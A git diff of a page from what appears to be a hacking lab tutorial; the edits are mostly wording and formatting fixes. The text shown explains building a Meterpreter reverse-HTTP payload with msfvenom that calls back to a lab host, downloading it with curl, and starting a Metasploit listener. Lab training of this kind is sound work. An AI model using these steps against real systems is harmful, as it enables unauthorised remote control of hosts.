@@ -1,14 +1,14 @@
 ---
 id: prepare_hack
-title: Preparing the hack
-sidebar_label: Preparation
+title: Setting up the payload
+sidebar_label: Set up the payload
 ---
 
 ## Creating a payload
 
 In order to hack the system, we first need to generate a payload that will allow us to get a reverse shell on the target host.
-Since the host we will be targetting is an amd64 system, we need to use the linux/x64/meterpreter_reverse_http payload.
-We also need to configure the payload with the address it will need to connect back to, to establish the reverse shell, in this case kali.container.shipyard.run and port 9999.
+Since the host we will be targetting is an amd64 system, we need to use the `linux/x64/meterpreter_reverse_http` payload.
+We also need to configure the payload with the address it will need to connect back to, to establish the reverse shell, in this case the ip that resolves to `kali.container.shipyard.run` and port 9999.
 
 We can do this by running `msfvenom` with our payload, the host and port we will be listening on, and the format we want the payload to be in.
 
@@ -23,7 +23,7 @@ Payload size: 1097244 bytes
 Final size of elf file: 1097244 bytes
 ```
 
-Lets double check that the payload is correctly generated, by making it executable and running it.
+Let's double check that the payload is correctly generated, by making it executable and running it.
 
 ```shell
 ┌──(root💀kali)-[/]
@@ -63,7 +63,7 @@ curl http://10.5.0.2:8000/payload -o payload
 
 Now that we have a payload and it is hosted somewhere, we need to start a listener to receive the incoming connections. We will be using meterpreter to do this.
 
-Lets start the metasploit framework console.
+Let's start the metasploit framework console.
 
 ```shell
 ┌──(root💀kali)-[/]
@@ -92,7 +92,7 @@ Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it wit
 msf6 >
 ```
 
-Now that we are in the Metasploit console, lets verify that everything is running correctly.
+Now that we are in the Metasploit console, let's verify that everything is running correctly.
 
 ```shell
 msf6 > db_status
